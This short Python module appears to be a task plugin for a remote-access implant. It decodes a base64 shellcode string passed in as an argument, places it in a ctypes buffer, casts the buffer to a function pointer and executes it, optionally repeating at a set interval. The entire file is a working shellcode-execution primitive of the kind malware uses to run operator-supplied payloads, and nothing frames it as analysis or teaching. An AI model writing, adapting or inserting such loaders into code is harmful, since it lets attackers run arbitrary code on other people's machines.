#takes and runs shellcode (with no return value)
#shcode - base64 encoded string of shell code to be run
#repeat - run shellcode repeat times
#period - run repetitions period seconds apart

import ctypes
import base64
import time

def run(config, **args):
	try:
		shcode = args["shcode"]
	except:
		return None, None
	try:
		repeat = args["repeat"]
	except:
		repeat = 1
	try:
		period = args["period"]
	except:
		period = 10

	shcode = base64.b64decode(shcode)
	shbuf = ctypes.create_string_buffer(shcode, len(shcode))
	shfunc = ctypes.cast(shbuf, ctypes.CFUNCTYPE(ctypes.c_void_p))
	if repeat == 1:
		shfunc()
		return None, "success"
	elif repeat > 1:
		while repeat > 0:
			shfunc()
			time.sleep(period)
			repeat -= 1
		return None, "success"
	else:
		return None, None
